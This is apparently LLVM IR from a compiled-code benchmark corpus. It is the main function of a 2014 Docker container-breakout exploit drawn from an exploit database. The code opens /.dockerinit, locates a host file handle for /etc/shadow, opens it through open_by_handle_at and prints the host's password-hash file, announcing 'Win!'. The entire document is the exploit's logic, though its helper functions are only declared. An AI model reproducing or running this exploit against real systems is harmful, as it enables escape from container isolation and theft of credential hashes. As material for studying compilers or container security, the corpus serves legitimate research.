; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33808.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33808.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.my_file_handle = type { i32, i32, i32 }
%struct.file_handle = type { i32 }

@__const.main.root_h = private unnamed_addr constant %struct.my_file_handle { i32 8, i32 1, i32 2 }, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [270 x i8] c"[***] docker VMM-container breakout Po(C) 2014             [***]\0A[***] The tea from the 90's kicks your sekurity again.     [***]\0A[***] If you have pending sec consulting, I'll happily     [***]\0A[***] forward to my friends who drink secury-tea too!      [***]\0A\0A<enter>\0A\00", align 1
@.str.1 = private unnamed_addr constant [13 x i8] c"/.dockerinit\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [9 x i8] c"[-] open\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"/etc/shadow\00", align 1
@.str.4 = private unnamed_addr constant [30 x i8] c"[-] Cannot find valid handle!\00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"[!] Got a final handle!\0A\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c"[-] open_by_handle\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"[-] read\00", align 1
@.str.8 = private unnamed_addr constant [41 x i8] c"[!] Win! /etc/shadow output follows:\0A%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.my_file_handle, align 4
  %6 = alloca %struct.my_file_handle, align 4
  store i32 0, i32* %1, align 4
  %7 = bitcast %struct.my_file_handle* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %7, i8* align 4 bitcast (%struct.my_file_handle* @__const.main.root_h to i8*), i64 12, i1 false)
  %8 = load i32, i32* @stderr, align 4
  %9 = call i32 (i32, i8*, ...) @fprintf(i32 %8, i8* getelementptr inbounds ([270 x i8], [270 x i8]* @.str, i64 0, i64 0))
  %10 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %11 = call i64 @read(i32 0, i8* %10, i32 1)
  %12 = load i32, i32* @O_RDONLY, align 4
  %13 = call i32 @open(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0), i32 %12)
  store i32 %13, i32* %3, align 4
  %14 = icmp slt i32 %13, 0
  br i1 %14, label %15, label %17

15:                                               ; preds = %0
  %16 = call i32 @die(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  br label %17

17:                                               ; preds = %15, %0
  %18 = load i32, i32* %3, align 4
  %19 = call i64 @find_handle(i32 %18, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0), %struct.my_file_handle* %6, %struct.my_file_handle* %5)
  %20 = icmp sle i64 %19, 0
  br i1 %20, label %21, label %23

21:                                               ; preds = %17
  %22 = call i32 @die(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0))
  br label %23

23:                                               ; preds = %21, %17
  %24 = load i32, i32* @stderr, align 4
  %25 = call i32 (i32, i8*, ...) @fprintf(i32 %24, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0))
  %26 = call i32 @dump_handle(%struct.my_file_handle* %5)
  %27 = load i32, i32* %3, align 4
  %28 = bitcast %struct.my_file_handle* %5 to %struct.file_handle*
  %29 = load i32, i32* @O_RDONLY, align 4
  %30 = call i32 @open_by_handle_at(i32 %27, %struct.file_handle* %28, i32 %29)
  store i32 %30, i32* %4, align 4
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %32, label %34

32:                                               ; preds = %23
  %33 = call i32 @die(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0))
  br label %34

34:                                               ; preds = %32, %23
  %35 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %36 = call i32 @memset(i8* %35, i32 0, i32 4096)
  %37 = load i32, i32* %4, align 4
  %38 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %39 = call i64 @read(i32 %37, i8* %38, i32 4095)
  %40 = icmp slt i64 %39, 0
  br i1 %40, label %41, label %43

41:                                               ; preds = %34
  %42 = call i32 @die(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0))
  br label %43

43:                                               ; preds = %41, %34
  %44 = load i32, i32* @stderr, align 4
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %46 = call i32 (i32, i8*, ...) @fprintf(i32 %44, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.8, i64 0, i64 0), i8* %45)
  %47 = load i32, i32* %4, align 4
  %48 = call i32 @close(i32 %47)
  %49 = load i32, i32* %3, align 4
  %50 = call i32 @close(i32 %49)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i64 @read(i32, i8*, i32) #2

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i32 @die(i8*) #2

declare dso_local i64 @find_handle(i32, i8*, %struct.my_file_handle*, %struct.my_file_handle*) #2

declare dso_local i32 @dump_handle(%struct.my_file_handle*) #2

declare dso_local i32 @open_by_handle_at(i32, %struct.file_handle*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
